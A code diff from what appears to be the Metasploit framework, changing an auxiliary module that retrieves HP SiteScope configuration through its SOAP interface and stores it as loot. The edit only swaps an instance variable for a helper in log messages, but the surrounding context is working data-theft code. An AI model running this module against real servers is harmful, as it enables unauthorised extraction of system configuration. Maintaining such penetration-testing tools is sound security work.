@@ -48,11 +48,10 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    @peer = "#{rhost}:#{rport}"
     @uri = normalize_uri(target_uri.path)
     @uri << '/' if @uri[-1,1] != '/'
 
-    print_status("#{@peer} - Connecting to SiteScope SOAP Interface")
+    print_status("#{peer} - Connecting to SiteScope SOAP Interface")
 
     uri = normalize_uri(@uri, 'services/APISiteScopeImpl')
 
@@ -61,7 +60,7 @@ class Metasploit4 < Msf::Auxiliary
       'method'  => 'GET'})
 
     if not res
-      print_error("#{@peer} - Unable to connect")
+      print_error("#{peer} - Unable to connect")
       return
     end
 
@@ -85,7 +84,7 @@ class Metasploit4 < Msf::Auxiliary
     data << "</wsns0:Body>" + "\r\n"
     data << "</wsns0:Envelope>"
 
-    print_status("#{@peer} - Retrieving the SiteScope Configuration")
+    print_status("#{peer} - Retrieving the SiteScope Configuration")
 
     uri = normalize_uri(@uri, 'services/APISiteScopeImpl')
 
@@ -104,7 +103,7 @@ class Metasploit4 < Msf::Auxiliary
         boundary = $1
       end
       if not boundary or boundary.empty?
-        print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+        print_error("#{peer} - Failed to retrieve the SiteScope Configuration")
         return
       end
 
@@ -112,7 +111,7 @@ class Metasploit4 < Msf::Auxiliary
         cid = $1
       end
       if not cid or cid.empty?
-        print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+        print_error("#{peer} - Failed to retrieve the SiteScope Configuration")
         return
       end
 
@@ -120,17 +119,17 @@ class Metasploit4 < Msf::Auxiliary
         loot = Rex::Text.ungzip($1)
       end
       if not loot or loot.empty?
-        print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+        print_error("#{peer} - Failed to retrieve the SiteScope Configuration")
         return
       end
 
       path = store_loot('hp.sitescope.configuration', 'application/octet-stream', rhost, loot, cid, "#{rhost} HP SiteScope Configuration")
-      print_status("#{@peer} - HP SiteScope Configuration saved in #{path}")
-      print_status("#{@peer} - HP SiteScope Configuration is saved as Java serialization data")
+      print_status("#{peer} - HP SiteScope Configuration saved in #{path}")
+      print_status("#{peer} - HP SiteScope Configuration is saved as Java serialization data")
       return
     end
 
-    print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+    print_error("#{peer} - Failed to retrieve the SiteScope Configuration")
   end
 
 end
